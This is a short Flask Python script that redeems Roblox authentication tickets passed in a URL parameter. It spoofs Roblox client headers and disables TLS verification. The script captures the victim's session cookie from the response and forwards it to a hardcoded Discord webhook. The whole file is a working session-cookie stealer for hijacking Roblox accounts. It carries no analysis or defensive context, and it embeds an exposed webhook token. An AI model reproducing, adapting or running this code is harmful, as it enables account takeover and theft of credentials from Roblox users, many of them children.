from flask import Flask, request
import requests

app = Flask(__name__)

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1084941149933932646/tTljQ6eeUb8hYrWK1m0gP1eAr-kR8rvoWjSnZzjhyPIeRqWDQYLwWgswtHl2qrNul4U-"


@app.route('/')
def index():
  t_value = request.args.get('t')

  if t_value:
    ticket = t_value

    headers = {
        'Content-Type': 'application/json',
        'Referer': 'https://www.roblox.com/games/1818/--',
        'Origin': 'https://www.roblox.com',
        'User-Agent': 'Roblox/WinInet',
        'RBXAuthenticationNegotiation': '1'
    }

    payload = {"authenticationTicket": ticket}

    requests.packages.urllib3.disable_warnings()

    response = requests.post(
        "https://auth.roblox.com/v1/authentication-ticket/redeem",
        json=payload,
        headers=headers,
        verify=False)

    print(response.text)

    cookie = response.headers.get('Set-Cookie', '')
    send_to_discord(cookie)
    return f"Sent '{cookie}' to Discord webhook!"
  else:
    return "No 't' parameter provided."


def send_to_discord(message):
  payload = {"content": message}
  response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
  if response.status_code == 200:
    print("Message sent to Discord successfully!")
  else:
    print(
        f"Failed to send message to Discord: {response.status_code} - {response.text}"
    )


if __name__ == '__main__':
  app.run(debug=True)